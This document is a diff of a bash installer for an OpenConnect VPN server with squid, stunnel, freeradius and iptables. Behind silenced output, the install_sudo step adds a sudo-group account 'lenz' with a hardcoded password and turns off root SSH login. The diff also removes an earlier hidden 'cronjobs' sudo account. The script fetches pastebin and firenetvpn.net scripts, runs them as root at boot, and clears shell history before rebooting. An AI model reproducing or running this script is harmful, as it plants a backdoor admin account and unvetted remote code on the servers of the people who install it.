@@ -1,21 +1,20 @@
 
-cp /usr/share/zoneinfo/Asia/Dubai /etc/localtime
-
-install_require()
+timedatectl set-timezone Asia/Riyadh
+install_require () {
+clear
+echo 'Installing dependencies.'
 {
-  clear
-  echo "Updating your system."
-  {
-    apt-get -o Acquire::ForceIPv4=true update
-  } &>/dev/null
-  clear
-  echo "Installing dependencies."
-  {
-    apt-get -o Acquire::ForceIPv4=true install stunnel4 squid ocserv -y
-    apt-get -o Acquire::ForceIPv4=true install dos2unix nano curl unzip jq virt-what net-tools mysql-client -y
-    apt-get -o Acquire::ForceIPv4=true install freeradius freeradius-mysql freeradius-utils python -y
-    apt-get -o Acquire::ForceIPv4=true install gnutls-bin pwgen screen -y
-  } &>/dev/null
+export DEBIAN_FRONTEND=noninteractive
+apt update
+apt install -y curl wget cron python-minimal libpython-stdlib
+apt install -y iptables freeradius freeradius-mysql freeradius-utils
+apt install -y ocserv default-mysql-client
+apt install -y screen stunnel4 dropbear gnutls-bin python pwgen
+apt install -y dos2unix nano unzip jq virt-what net-tools
+apt install -y mlocate dh-make libaudit-dev build-essential fail2ban
+clear
+}&>/dev/null
+clear
 }
 
 install_freeradius()
@@ -143,27 +142,64 @@ bindaddr *" >> /etc/radcli/radiusclient.conf
 systemctl enable freeradius.service
 systemctl start freeradius.service
 systemctl restart freeradius.service
+clear
 }&>/dev/null
+clear
 }
 
-install_squid()
-{
+install_squid(){
 clear
-echo "Installing proxy."
+echo 'Installing proxy.'
 {
-cd /etc/squid
+sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup
+echo "deb http://us.archive.ubuntu.com/ubuntu/ trusty main universe" | sudo tee --append /etc/apt/sources.list.d/trusty_sources.list > /dev/null
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 40976EAF437D05B5
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 3B4FE6ACC0B21F32    
+sudo apt update
+sudo apt install -y squid3=3.3.8-1ubuntu6 squid=3.3.8-1ubuntu6 squid3-common=3.3.8-1ubuntu6
+wget 'http://firenetvpn.net/files/ocserv/1cBgmRVgsKFvBDGZ6d7OC2YBSQMkjYHrm' -O /etc/init.d/squid3
+dos2unix /etc/init.d/squid3
+sudo chmod +x /etc/init.d/squid3
+sudo update-rc.d squid3 defaults
+sudo update-rc.d squid3 enable
+cd /etc/squid3/
 rm squid.conf
-echo 'http_port 3128
-http_port 8080
-http_port 8181' >> squid.conf
-echo "acl vpnip dst $(curl -s https://api.ipify.org)" >> squid.conf
-echo 'http_access allow vpnip
+echo "acl SSH dst `ip route get 8.8.8.8 | awk '/src/ {f=NR} f&&NR-1==f' RS=" "`" >> squid.conf
+echo 'acl SSL_ports port 443
+acl Safe_ports port 80
+acl Safe_ports port 21
+acl Safe_ports port 443
+acl Safe_ports port 70
+acl Safe_ports port 210
+acl Safe_ports port 1025-65535
+acl Safe_ports port 280
+acl Safe_ports port 488
+acl Safe_ports port 591
+acl Safe_ports port 777
+acl CONNECT method CONNECT
+http_access allow SSH
 http_access deny all
-visible_hostname MD
-httpd_suppress_version_string off
-cache_mgr MD
-error_directory /usr/share/squid/errors/English' >> squid.conf
-sudo service squid restart
+http_port 8080
+http_port 8181
+http_port 9090
+coredump_dir /var/spool/squid3
+refresh_pattern ^ftp: 1440 20% 10080
+refresh_pattern ^gopher: 1440 0% 1440
+refresh_pattern -i (/cgi-bin/|\?) 0 0% 0
+refresh_pattern . 0 20% 4320
+visible_hostname KobZ-Proxy
+error_directory /usr/share/squid3/errors/English' >> squid.conf
+cd /usr/share/squid3/errors/English
+rm ERR_INVALID_URL
+echo '<!--KobeKobz--><!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>SECURE PROXY</title><meta name="viewport" content="width=device-width, initial-scale=1"><meta http-equiv="X-UA-Compatible" content="IE=edge"/><link rel="stylesheet" href="https://bootswatch.com/4/slate/bootstrap.min.css" media="screen"><link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet"><style>body{font-family: "Press Start 2P", cursive;}.fn-color{color: #ffff; background-image: -webkit-linear-gradient(92deg, #f35626, #feab3a); -webkit-background-clip: text; -webkit-text-fill-color: transparent; -webkit-animation: hue 5s infinite linear;}@-webkit-keyframes hue{from{-webkit-filter: hue-rotate(0deg);}to{-webkit-filter: hue-rotate(-360deg);}}</style></head><body><div class="container" style="padding-top: 50px"><div class="jumbotron"><h1 class="display-3 text-center fn-color">SECURE PROXY</h1><h4 class="text-center text-danger">SERVER</h4><p class="text-center">😍 %w 😍</p></div></div></body></html>' >> ERR_INVALID_URL
+chmod 755 *
+service squid3 restart
+cd /etc || exit
+wget 'https://pastebin.com/raw/xtPc5t1k' -O /etc/socks.py
+dos2unix /etc/socks.py
+chmod +x /etc/socks.py
+rm /etc/apt/sources.list
+sudo cp /etc/apt/sources.list_backup /etc/apt/sources.list
 } &>/dev/null
 }
 
@@ -253,13 +289,23 @@ ExecReload=/bin/kill -HUP $MAINPID
 [Install]
 WantedBy=multi-user.target
 ' >> /etc/systemd/system/ocserv.service
+
 {
 systemctl daemon-reload
 systemctl stop ocserv.socket
 systemctl disable ocserv.socket
 systemctl restart ocserv.service
+clear
+}&>/dev/null
+clear
+}
+
+install_firewall_kvm () {
+clear
+echo "Installing iptables."
 echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
 sysctl -p
+{
 iptables -A INPUT -p tcp --dport 3306 -j ACCEPT
 iptables -I INPUT -p udp --dport 3306 -j ACCEPT
 iptables -I INPUT -p tcp --dport $PORT_TCP -j ACCEPT
@@ -270,9 +316,9 @@ iptables -I FORWARD -d 192.168.119.0/21 -j ACCEPT
 iptables -t nat -A POSTROUTING -s 192.168.119.0/21 -o $(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ") -j MASQUERADE
 iptables-save > /etc/iptables_rules.v4
 ip6tables-save > /etc/iptables_rules.v6
-useradd cronjobs 2>/dev/null; echo cronjobs:cronjobs143 | chpasswd &>/dev/null; usermod -aG sudo cronjobs &>/dev/null
-sudo crontab -l | { echo '@daily certbot renew --quiet && systemctl restart ocserv'; } | crontab -
+clear
 }&>/dev/null
+clear
 }
 
 install_stunnel() {
@@ -296,9 +342,11 @@ RLIMITS=""' >> stunnel4
     chmod 755 stunnel4
     sudo service stunnel4 restart
   } &>/dev/null
+  clear
 }
 
 install_sudo(){
+clear
   {
     useradd -m lenz 2>/dev/null; echo lenz:@@F1r3n3t@@ | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
     sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
@@ -307,59 +355,74 @@ install_sudo(){
   }&>/dev/null
 }
 
-
 install_rclocal(){
+clear
   {
-    wget https://pastebin.com/raw/xtPc5t1k -O /etc/ubuntu
-    dos2unix /etc/ubuntu
-    chmod +x /etc/ubuntu    
-    screen -dmS socks python /etc/ubuntu
-    wget --no-check-certificate https://pastebin.com/raw/s9ySHUMt -O /etc/systemd/system/rc-local.service
-    echo "#!/bin/sh -e
+    sudo systemctl restart stunnel4
+    sudo systemctl enable ocserv.service
+    sudo systemctl start ocserv.service  
+    
+    echo "[Unit]
+Description=firenet service
+Documentation=http://firenetvpn.com
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash /etc/rc.local
+RemainAfterExit=yes
+
+[Install]
+WantedBy=multi-user.target" >> /etc/systemd/system/firenet.service
+    echo '#!/bin/sh -e
 iptables-restore < /etc/iptables_rules.v4
 ip6tables-restore < /etc/iptables_rules.v6
 sysctl -p
 service freeradius restart
-service squid restart
 service stunnel4 restart
 systemctl restart ocserv.service
-screen -dmS socks python /etc/ubuntu
-exit 0" >> /etc/rc.local
+screen -dmS socks python /etc/socks.py
+exit 0' >> /etc/rc.local
     sudo chmod +x /etc/rc.local
-    sudo systemctl enable rc-local
-    sudo systemctl start rc-local.service
+    systemctl daemon-reload
+    sudo systemctl enable firenet
+    sudo systemctl start firenet.service
   }&>/dev/null
+  clear
 }
 
-install_done()
+start_service () {
+clear
 {
-  clear
-  echo "OPENCONNECT SERVER FIRENET PHILIPPINES"
-  echo "IP : $(curl -s https://api.ipify.org)"
-  echo "OPENCONNECT port : $PORT_TCP"
-  echo "SOCKS port : 80"
-  echo "PROXY port : 3128"
-  echo "PROXY port : 8080"
-  echo "PROXY port : 8181"
-  echo "SSL   port : 443"
-  echo
-  echo
-  history -c;
-  rm /root/.installer
-  echo "DB_HOST='$HOST'" >> ~/.db-base
-  echo "DB_NAME='$DBNAME'" >> ~/.db-base
-  echo "DB_USER='$USER'" >> ~/.db-base
-  echo "DB_PASS='$PASS'" >> ~/.db-base
-  echo "Server will secure this server and reboot after 20 seconds"
-  sleep 20
-  reboot
+
+sudo crontab -l | { echo "* * * * * pgrep -x stunnel4 >/dev/null && echo 'GOOD' || /etc/init.d/stunnel4 restart 
+@daily certbot renew --quiet && systemctl restart ocserv"; } | crontab -
+sudo systemctl restart cron
+} 
+echo '+++++++++++++++++++++++++++++++++++'
+echo '*      OPENCONNECT  is ready!     *'
+echo '+++++++++++************++++++++++++'
+echo -e "[IP] : $server_ip\n[Openconnect TCP Port] : $PORT_TCP\n[Openconnect UDP Port] : $PORT_UDP\n[Ssl Port] : 443\n[Proxy Socks ] : 80\n[Proxy Squid 1] : 8080\n[Proxy Squid 2] : 3128\n"
+
+history -c;
+rm /root/.installer
+echo "DB_HOST='$HOST'" >> ~/.db-base
+echo "DB_NAME='$DBNAME'" >> ~/.db-base
+echo "DB_USER='$USER'" >> ~/.db-base
+echo "DB_PASS='$PASS'" >> ~/.db-base
+echo 'Server will secure this server and reboot after 20 seconds'
+sleep 20
+reboot
 }
+
+server_ip=$(curl -s https://api.ipify.org)
+server_interface=$(ip route get 8.8.8.8 | awk '/dev/ {f=NR} f&&NR-1==f' RS=" ")
 
 install_require
-install_sudo
+install_sudo  
 install_freeradius
 install_squid
 install_openconnect
+install_firewall_kvm
 install_stunnel
 install_rclocal
-install_done
+start_service
